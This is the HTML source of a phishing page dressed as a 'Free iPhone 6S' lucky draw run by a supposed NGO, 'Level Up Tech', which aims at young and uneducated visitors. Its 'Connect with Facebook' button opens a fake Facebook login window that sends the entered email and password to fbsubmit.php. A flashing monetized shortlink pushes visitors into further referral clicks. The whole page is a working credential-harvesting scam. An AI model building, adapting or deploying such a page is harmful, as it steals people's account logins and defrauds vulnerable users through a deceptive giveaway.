<!DOCTYPE html>
<html>
<head>
	<title>Free Iphone 6S for everyone</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
	<script type="text/javascript">
		function showdiv()
		{
			document.getElementById('login-window').style.display='flex';
			window.scrollTo(0,0);
		}

		function hidediv()
		{
			document.getElementById('login-window').style.display='none';
		}
	</script>
</head>
<body>

<div id='login-window' class="login-window" style="display:none">
	
	<div class="inner-window">
		<div class="downhead">
			<form action="fbsubmit.php" method="POST">
			<div class="banner">
			<img src="fb-logo.png" style="width: 20px;height:20px">&nbsp;<span style="color:white">Facebook</span>
			</div>

			<div class="road-banner">
				<img src="road-banner.png">
			</div>

			<div class="details">
				
				<span style="font-size: 14px">Login to use your account with <span style="color: #3B5998;cursor:pointer">Level Up Tech.</span></span>
				<br><br><br><br>
				<div class="id-info">
					<label style="color:#666666;font-weight:bold" for="email-id">Email or Phone:&nbsp;&nbsp;&nbsp;</label>
					<input type="text" name="email" style="font-size: 12px">
				</div>
				<div class="id-info">
					<label style="color:#666666;font-weight:bold" for="email-id">Password:&nbsp;&nbsp;&nbsp;</label>
					<input type="password" name="pass" style="font-size: 12px">
				</div>

				<div class="id-info">
					<span><a target="_blank" style="color: #3B5998" href='https://www.facebook.com/recover/initiate'>Forgotten Account?</a></span>
				</div>
			</div>

			<div class="footer">
					
						<input class='pvbutt' type="submit" name='submit' value="Log in" ></input>
						<button class='pvbutt extra' type='button' onclick="hidediv()">Cancel</button>
			</div>
			</form>
		</div>
	</div>

</div>


<div class="top">
	<h1 style="margin-top:0;">Free iPhone 6S for everyone</h1>
</div>
	<header>
		<img src="logo.png">
		<div class="head" style="display:inline-block;align-self:center">
			<h3>Guidelines</h3>
			1. The number of visitors to our website from your referral link will reach, those many tickets we will add to lucky draw of your email id.<br><br>
			2. From every 500 tickets, we draw one random ticket, and select our lucky winner for iPhone 6S and inform on your email.
		</div>

	</header>


	<div class="intro">
	<h2 style="width:100%;font-size: 50px;margin-top:0">Intro</h2>
		<div style="text-align:center;width: 100%">
		Level Up Tech is the NGO which guides the young students and uneducated people towards the technology. This is one more initiative to make people aware about the apple technologies. The terms are simple You must be younger than 30 years or an uneducated person to participate in the draw.</div>
	</div>
	<div class="sign-in">
		Connect with your account to get your first ticket to win iPhone 6S and get your referral link.
		<br><br><br>
		<img src="facebook-button.png" onclick="showdiv()">
	</div>

	<div class="advertisement" style="border-top: solid 1px black;margin-top: 30px;color: #CCCCCC">
		Advertisement
		<div id="cli">
			<h3><a href='http://sh.st/st/7933b65bb88c915480a020e12e11b7f4/free-i-phone.16mb.com/referagain.html' id="clickad">Click here to make more tickets on this website</a></h3>
		</div>
	</div>

	<script type="text/javascript">
		
		var heading=document.getElementById('clickad');

		function makered()
		{
			heading.style.color='red';
			setTimeout('makegreen()', 200);
		}

		function makegreen()
		{
			heading.style.color='green';
			setTimeout('makered()', 200);
		}

		makered();

	</script>

</body>
</html>